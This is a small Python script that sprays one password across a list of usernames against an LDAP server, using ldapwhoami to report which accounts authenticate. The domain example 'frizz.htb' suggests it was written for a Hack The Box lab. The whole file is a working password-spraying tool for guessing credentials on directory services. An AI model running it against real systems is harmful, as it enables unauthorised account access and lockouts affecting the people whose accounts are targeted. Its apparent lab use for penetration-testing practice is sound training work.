import argparse
import subprocess

def test_users(ldap_server, base_dn, domain, password, userfile):
    with open(userfile, 'r') as f:
        users = [line.strip() for line in f if line.strip()]

    for user in users:
        print(f"Testing user: {user}")
        bind_user = f"{user}@{domain}"
        cmd = [
            "ldapwhoami",
            "-x",
            "-H", f"ldap://{ldap_server}:389",
            "-D", bind_user,
            "-w", password
        ]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            print(f"  [+] Authentication successful for {user}")
        else:
            print(f"  [-] Authentication failed for {user}")
        print("--------------------------------------")

def main():
    parser = argparse.ArgumentParser(description="LDAP user authentication checker")
    parser.add_argument("-s", "--server", required=True, help="LDAP server IP or hostname")
    parser.add_argument("-d", "--domain", required=True, help="Domain name (e.g. frizz.htb)")
    parser.add_argument("-p", "--password", required=True, help="Password for all users")
    parser.add_argument("-u", "--userfile", required=True, help="File with usernames, one per line")
    args = parser.parse_args()

    test_users(args.server, None, args.domain, args.password, args.userfile)

if __name__ == "__main__":
    main()
